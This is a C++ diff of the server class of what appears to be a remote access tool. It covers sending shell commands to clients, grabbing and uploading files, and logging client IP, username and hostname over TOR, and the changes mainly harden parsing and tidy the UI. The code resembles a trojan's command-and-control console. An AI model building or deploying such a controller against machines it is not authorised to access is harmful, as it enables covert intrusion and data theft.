@@ -50,18 +50,18 @@ private:
     void parseSendCmd(std::string cmd){
         this->servLogWin->add("connection::parseSendCmd() - INFO: Called with cmd: " + cmd);
         this->plainTextMessageHistory.push_back("--> " + cmd);
-        if(cmd.starts_with("clear")){
+        if(cmd == "clear"){
             this->plainTextMessageHistory.clear();
         }
 
         // These commands just make things a but more linux-like (they just call the windows equivalent)
-        else if(cmd.starts_with("pwd")){
+        else if(cmd == "pwd"){
             this->exec("cd");
         }
-        else if(cmd.starts_with("ls -a") || cmd.starts_with("ls -la")){ // ls -la is what i type out of habit, so ill add it even though really the -l doesnt do anything
+        else if(cmd == "ls -a" || cmd == "ls -la"){ // ls -la is what i type out of habit, so ill add it even though really the -l doesnt do anything
             this->exec("dir /a");
         }
-        else if(cmd.starts_with("ls")){
+        else if(cmd == "ls"){
             this->exec("dir");
         }
         else if(cmd.starts_with("rm ")){
@@ -100,7 +100,7 @@ private:
         this->servLogWin->add("connection::genericCmd() - INFO: Sent " + std::to_string(bytesSent) + " bytes to client");
         if(bytesSent < 0){ // A negative value indicates an error
             this->servLogWin->add("connection::genericCmd( - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
-            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
+            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
         }
@@ -144,7 +144,7 @@ private:
         this->servLogWin->add("connection::grab() - INFO: Sent " + std::to_string(bytesSent) + " bytes to client");
         if(bytesSent < 0){
             this->servLogWin->add("connection::grab() - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
-            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
+            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
         }
@@ -170,16 +170,23 @@ private:
             this->sockFdMutex.unlock();
             return;
         }
-        unsigned long long int fileSize = std::stoull(grabRecvBufferString.substr(5+path.size()+1)); // !!! unsafe as fuck :( 
+        long long int fileSize;
+        try{
+            fileSize = std::stoull(grabRecvBufferString.substr(5+path.size()+1));
+        }catch(...){
+            this->servLogWin->add("connection::grab() - ERR: std::stoull failed, client sent invalid response");
+            this->plainTextMessageHistory.push_back("ERR: std::stoull failed, client sent invalid response");
+            this->sockFdMutex.unlock();
+            return;
+        }
         this->servLogWin->add("connection::grab() - INFO: Full file size: " + std::to_string(fileSize));
-        
 
         // Read the file data into an std::vector<char>, receive more data from the socket if the fileSize is greater than what has been received so far:
         std::vector<char> fileData;
         fileData.reserve(fileSize); // Hopefully speeds up the insert() calls as memory is already allocated
         unsigned int headerSize = 5+path.size()+1+std::to_string(fileSize).size()+1; // The size of "grab;[path];[file size];", so we can ignore it when 
         fileData.insert(fileData.end(), grabRecvBuffer+headerSize, grabRecvBuffer+bytesReceived); // Insert the data that was received in the first recv() call, minus the header
-        unsigned long long int bytesReceivedTotal = bytesReceived - headerSize; // The total number of bytes of actual file data that has been received so far
+        long long int bytesReceivedTotal = bytesReceived - headerSize; // The total number of bytes of actual file data that has been received so far
         if((long long int)fileSize-(long long int)bytesReceivedTotal > 0){
             this->servLogWin->add("connection::grab() - INFO: Receiving remaining " + std::to_string((long long int)fileSize-(long long int)bytesReceivedTotal) + " bytes of data");
         }
@@ -236,7 +243,7 @@ private:
             int bytesSent = send(this->sockFd, uploadData.data(), uploadData.size(), 0);
             if(bytesSent < 0){
                 this->servLogWin->add("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
-                this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
+                this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
                 this->sockFdMutex.unlock();
                 return;
             }
@@ -275,13 +282,13 @@ private:
         int bytesSent = send(this->sockFd, ("exec;" + cmd + ";").c_str(), cmd.length() + 6, 0);
         if(bytesSent < 0){
             this->servLogWin->add("connection::exec() - ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
-            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)" + " | " + strerror(errno));
+            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
             this->sockFdMutex.unlock();
             return;
         }
         this->servLogWin->add("connection::exec() - INFO: Sent " + std::to_string(bytesSent) + " bytes of data, waiting for response");
 
-        // Receive the first 4096 bytes of the response, this is by far enough to get the response length:
+        // Receive the first 4096 bytes of the response
         char responseBuffer[4096] = {0};
         this->servLogWin->add("connection::exec() - INFO: Receiving first 4096 bytes of response");
         int bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
@@ -301,7 +308,15 @@ private:
             this->sockFdMutex.unlock();
             return;
         }
-        unsigned long long int responseSize = std::stoull(responseBufferString.substr(6+cmd.size())); // Unsafe poopoo code!!!!!
+        long long int responseSize;
+        try{
+            responseSize = std::stoull(responseBufferString.substr(6+cmd.size()));
+        }catch(...){
+            this->servLogWin->add("connection::exec() - ERR: std::stoull failed, client sent invalid response");
+            this->plainTextMessageHistory.push_back("ERR: std::stoull failed, client sent invalid response");
+            this->sockFdMutex.unlock();
+            return;
+        }
         this->servLogWin->add("connection::exec() - INFO: Full response size: " + std::to_string(responseSize));
 
         // Add the first 4096-<header size> bytes of the first chunk of the response to the response vector:
@@ -311,7 +326,7 @@ private:
         response.insert(response.end(), responseBufferString.begin()+headerSize, responseBufferString.end());
 
         // Receive more chunks of 4096 bytes until the total number of bytes received is equal to the response size:
-        unsigned long long int bytesReceivedTotal = bytesReceived - headerSize;
+        long long int bytesReceivedTotal = bytesReceived - headerSize;
         if((long long int)responseSize-(long long int)bytesReceivedTotal > 0){
             this->servLogWin->add("connection::exec() - INFO: Receiving remaining " + std::to_string((long long int)responseSize-(long long int)bytesReceivedTotal) + " bytes of response");
         }
@@ -349,6 +364,8 @@ public:
     std::string publicIp; // Public IP of the client - sent by the client since we can't get it from the socket due to the usage of TOR
     bool terminalActive = false; // Whether or not the terminal is being displayed and used
 
+
+
     // Constructor and destructor are pretty basic:
     connection(int sockFd, logWindow* logWin){
         this->servLogWin = logWin;
@@ -366,16 +383,16 @@ public:
         Consists of a scrolling text box and an input box which sends the message when enter is pressed
         The input box is set to always have keyboard focus
     */
-    void draw(float wWidthStartPercent,
-              float wHeightStartPercent,
-              float wWidthEndPercent,
-              float wHeightEndPercent,
-              ImGuiCond condition=ImGuiCond_Always){
-        uiHelper::configNextWinPosSizePercent(wWidthStartPercent,
-                                              wHeightStartPercent,
-                                              wWidthEndPercent,
-                                              wHeightEndPercent,
-                                              condition);
+    void draw(float wStartXNorm,
+              float wStartYNorm,
+              float wEndXNorm,
+              float wEndYNorm,
+              ImGuiCond wCondition=ImGuiCond_Always){
+        uiHelper::setNextWindowSizeNormalised(wStartXNorm,
+                                              wStartYNorm,
+                                              wEndXNorm,
+                                              wEndYNorm,
+                                              wCondition);
         ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " terminal").c_str());
 
         // Draw the scrolling text box, adding each item from this->plainTextMessageHistory:
@@ -399,10 +416,10 @@ public:
             }
             // Insert history msg into input buff
             if(this->commandHistory.size() > 0 && this->cmdHistSelected != 0){
-                ImGui::ClearActiveID();
+                ImGui::ClearActiveID(); // Remove focus from input box so the contents of the input buffer can be modified
                 memset(this->inputBuffer, 0, this->inputBufferSize);
                 strcpy(this->inputBuffer, this->commandHistory[this->commandHistory.size()-this->cmdHistSelected].c_str());
-                ImGui::SetKeyboardFocusHere();
+                ImGui::SetKeyboardFocusHere(); // Bring focus back to input box
             }
             // Clear the buffer if scrolling back down to 0
             if(this->cmdHistSelected == 0){
@@ -461,11 +478,8 @@ public:
         this->username = bufferString.substr(0, bufferString.find(';'));
         bufferString = bufferString.substr(bufferString.find(';') + 1);
         this->hostname = bufferString.substr(0, bufferString.find(';'));
-        /*
-            ... add some more verification here if you want to make extra sure the client is sending valid data ...
-        */
-    
         this->servLogWin->add("connection::intialConnection() - INFO: Parsed client info: " + this->publicIp + " | " + this->username + " | " + this->hostname);
+        // ... add some more verification here if you want to make extra sure the client is sending valid data ...
 
         // Send the confirmation message to the client, since the connection was successful:
         std::string confirmMsg = this->publicIp + ";" + this->username + ";" + this->hostname + ";connected;";
@@ -481,8 +495,8 @@ public:
     }
 
     /*
-        Draws terminal window if it is active
-        Also processes any commands that need to be sent
+        Parses and sends the command in this->msgToSend if there is one
+        Also flushes the socket (read everything in recv buff)
     */
     void update(){
         // If this->msgToSend is not empty, then there is a command that needs to be processed:
@@ -490,13 +504,11 @@ public:
             this->parseSendCmd(this->msgToSend);
             this->msgToSend = ""; // Clear msgToSend now that the command has been processed
         }
-
         this->flushSocket(); // Clear out the recv buffer
     }
 
     /*
-        This function is called by a separate thread every <n> seconds to check if the connection is still alive
-        The function which calls this function checks that this->terminalActive is false before calling this function (dont ping a terminal that is being used)
+        Returns true if the client responds to "ping;" with "pong;"
     */
     bool connectivityCheck(){
         this->sockFdMutex.lock();
@@ -513,20 +525,6 @@ public:
         }
         this->sockFdMutex.unlock();
         return true;
-    }
-
-    /*
-        Draws a window with some info about the connection
-        Not particularly useful.
-    */
-    void drawDebugWindow(){ // Draws some basic debug info to the screen
-        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
-        ImGui::SetNextWindowSize(ImVec2(25, 6), ImGuiCond_Once);
-        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " debug info").c_str());
-        ImGui::Text("Username: %s", this->username.c_str());
-        ImGui::Text("Hostname: %s", this->hostname.c_str());
-        ImGui::Text("Public IP: %s", this->publicIp.c_str());
-        ImGui::End();
     }
 
     /*
